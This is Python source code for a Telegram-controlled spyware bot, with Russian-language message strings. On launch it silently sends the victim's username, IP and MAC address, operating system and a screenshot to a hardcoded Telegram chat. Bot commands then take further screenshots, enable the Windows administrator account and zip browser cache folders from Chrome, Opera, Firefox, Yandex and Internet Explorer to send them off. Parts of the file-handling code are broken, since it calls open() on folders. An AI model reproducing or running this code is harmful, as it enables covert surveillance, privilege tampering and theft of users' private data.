import logging
import getpass
import os
import socket
import sys
import pyautogui
import zipfile
from os.path import abspath
from uuid import getnode as get_mac
from aiogram import Bot, Dispatcher, executor, types

logging.basicConfig(level=logging.INFO)

TOKEN =''

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)


async def start(*args):
    bot = Bot(token=TOKEN)
    name = getpass.getuser()
    ip = socket.gethostbyname(socket.getfqdn())
    mac = get_mac()
    ost = sys.platform
    if ost == "win32":
        ost = str("Windows")
    elif ost == "linux":
        ost = str("Linux")
    elif ost == "darwin":
        ost = str("Mac OS")
    else:
        pass
    await bot.send_message(text=f'!!!ПРОГРАММА ЗАПУЩЕНА!!! \nИмя пользователя: {name} \nIp-адресс: {ip} \nMAC-адресс: {mac} \nСистема: {ost}', chat_id='892341815')
    pyautogui.screenshot("screenshot.jpg")
    with open('screenshot.jpg', 'rb') as photo:
        await bot.send_document(chat_id='ur chat id with ur bot', document=photo)
    os.remove('screenshot.jpg')


@dp.message_handler()
async def bot(message: types.message):
    if message.text == '/info':
        name = getpass.getuser()
        ip = socket.gethostbyname(socket.getfqdn())
        mac = get_mac()
        ost = sys.platform
        if ost == "win32":
            ost = str("Windows")
        elif ost == "linux":
            ost = str("Linux")
        elif ost == "darwin":
            ost = str("Mac OS")
        else:
            pass
        await message.answer(f'Имя пользователя: {name} \nIp-адресс: {ip} \nMAC-адресс: {mac} \nСистема: {ost}')
        pyautogui.screenshot("screenshot.jpg")
        with open('screenshot.jpg', 'rb') as photo:
            await bot.send_document(chat_id=message.chat.id, document=photo)
            os.remove('screenshot.jpg')

    elif message.text == '/screen':
        pyautogui.screenshot("screenshot.jpg")
        with open('screenshot.jpg', 'rb') as photo:
            await bot.send_document(chat_id=message.chat.id, document=photo)
            os.remove('screenshot.jpg')

    elif message.text == '/cache':
        os.system('net user administrator /active:yes')
        name = getpass.getuser()
        disk = abspath(__name__)[0]
        try:
            opera = zipfile.ZipFile('opera.zip', 'w')
            dir = open(f'{disk}://Users//{name}//AppData//Local//Opera Software//Opera Stable\Cache')
            for file in dir:
                opera.write(file)
            dir.close()
            opera.close()
            await bot.send_document(document='opera.zip', chat_id=message.chat.id)
        except:
            pass

        try:
            chrome = zipfile.ZipFile('chrome.zip', 'w')
            dir = open(f'{disk}://Users//{name}//AppData//Local//Google//Chrome//User Data//Default//Cache')
            for file in dir:
                chrome.write(file)
            dir.close()
            dir = open(f'{disk}://Users//{name}//AppData//Local//Google//Chrome//User Data//Profile 1//Cache')
            for file in dir:
                chrome.write(file)
            dir.close()
            chrome.close()
            await bot.send_document(document='chrome.zip', chat_id=message.chat.id)
        except:
            pass

        try:
            firefox = zipfile.ZipFile('firefox.zip', 'w')
            dir = open(
                f'{disk}://Users//{name}//AppData//Local//Mozilla//Firefox//Profiles//zxcvb5678.default//cache2//entries')
            for file in dir:
                firefox.write(file)
            dir.close()
            firefox.close()
            await bot.send_document(document='firefox.zip', chat_id=message.chat.id)

        except:
            pass

        try:
            yandex = zipfile.ZipFile('yandex.zip', 'w')
            dir = open(f'{disk}://Users//{name}//AppData//Local//Yandex//YandexBrowser//User Data//Default//Cache')
            for file in dir:
                yandex.write(file)
            dir.close()
            yandex.close()
            await bot.send_document(document='yandex.zip', chat_id=message.chat.id)
        except:
            pass

        try:
            InternetExplorer = zipfile.ZipFile('InternetExplorer.zip', 'w')
            dir = open(f'{disk}://Users//Admin//AppData//Local//Microsoft//Windows//INetCache// ')
            for file in dir:
                InternetExplorer.write(file)
            dir.close()
            dir = open(f'{disk}://Users//Admin//AppData//Local//Microsoft//Windows//Temporary Internet Files// ')
            for file in dir:
                InternetExplorer.write(file)
            dir.close()
            InternetExplorer.close()
            await bot.send_document(document='InternetExplorer.zip', chat_id=message.chat.id)
        except:
            pass

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=start)
